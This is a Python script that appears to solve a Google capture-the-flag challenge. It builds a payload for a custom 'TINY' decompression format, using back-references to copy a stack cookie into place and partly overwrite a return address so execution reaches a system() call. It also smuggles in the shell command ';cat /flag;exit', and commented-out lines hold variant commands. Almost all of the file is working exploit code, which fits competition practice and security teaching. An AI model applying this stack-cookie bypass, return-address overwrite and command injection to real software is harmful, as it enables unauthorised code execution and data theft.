# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

def varint(n):
    if n < 0:
        n += 2**64
    if n == 0:
        return "00"
    s = ""
    while n:
        if n >= 128:
            s += "{:02x}".format(128 | (n&127))
        else:
            s += "{:02x}".format(n&127)
        n >>= 7
    return s


def rep(delta, length):
    return "ff" + varint(delta) + varint(length)

# 00c99e22283d6c40 - stack cookie
# 0000000000000000
# 0000000000000000
# 50acffffff7f0000 - reg
# 50adffffff7f0000 - reg
# 50cdffffff7f0000 - reg
# 9154555555550000 - retaddr

RETADDR = 0x533e # Only low three nibbles matter.

cmd = b';cat /flag;exit'
cmd += b'\x00'
while len(cmd) % 8 != 0:
    cmd += b'\x00'
cmd = cmd.hex()

exploit = "54494e59" # TINY
exploit += cmd # Start of decompression buffer will be our command
exploit += rep(9000+48+144, 8) # Stack cookie
exploit += "42" * 8 # Dummy registers
exploit += rep(0x2500-424-24, 8) # Pop dst buffer as rbp
exploit += "42" * 8 # Dummy registers
exploit += "42" * 8 # Dummy registers
exploit += "42" * 8 # Dummy registers

if 1:
    exploit += "{:02x}{:02x}".format(RETADDR & 0xff, RETADDR >> 8)
    exploit += rep(9000+48, 6) # Fake return address to before system call

    exploit += "4242424242424242" # BBBBBBBB
    exploit += "4242424242424242" # BBBBBBBB
    #exploit += b"echo PWNED && cat flag && echo DONE && sleep 1\x00".hex() # Fake command
    exploit += rep(4096-8, 4096+1024) # Copy the retaddr and stuff
    #exploit += rep(16, 4096)
    #exploit += b"echo PWNED".hex()

exploit += rep(0, 0) # EOF

print("2 %s" % exploit)




